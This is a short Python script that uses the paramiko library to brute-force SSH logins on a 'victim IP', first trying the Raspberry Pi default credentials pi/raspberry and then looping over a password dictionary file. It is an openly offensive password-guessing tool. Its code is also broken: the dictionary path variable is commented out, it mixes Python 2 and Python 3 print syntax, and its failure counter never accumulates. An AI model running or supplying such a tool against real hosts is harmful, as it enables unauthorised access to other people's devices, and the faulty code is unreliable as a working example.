import paramiko
import time



def connect(host, user, passwd):
    Fails = 0
    try:
        s = paramiko.SSHClient()
        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        s.connect(host, username=user, password=passwd)
        print('Password Found: ' + passwd)
        
        
    except Exception as e:
        if Fails > 5:
            print('!!! Too many socket Timeout!')
            exit(0)
        elif 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            return connect(host, user, passwd)
        elif 'syncronize with origanal prompt' in str(e):
            time.sleep(1)
            return connect(host, user, passwd)
        return None

def Main():
    host = input("Enter your victim IP: ")
    #user = raw_input("Enter your victim Username: ")
    #dic = raw_input("Enter your dic path: ") 
    user='pi'
    passwd='raspberry'
    con = connect(host, user, passwd)
    
    with open(dic, 'r') as infile:
        start = time.time()
        for line in infile:
            passwd = line.strip('\r\n')
            print "Testing: " + str(passwd)
            con = connect(host, user, passwd)
        end = time.time()
        t_time = end - start
        print "Total runtime was -- ", t_time, "second"
                     
if __name__ == '__main__':
    Main()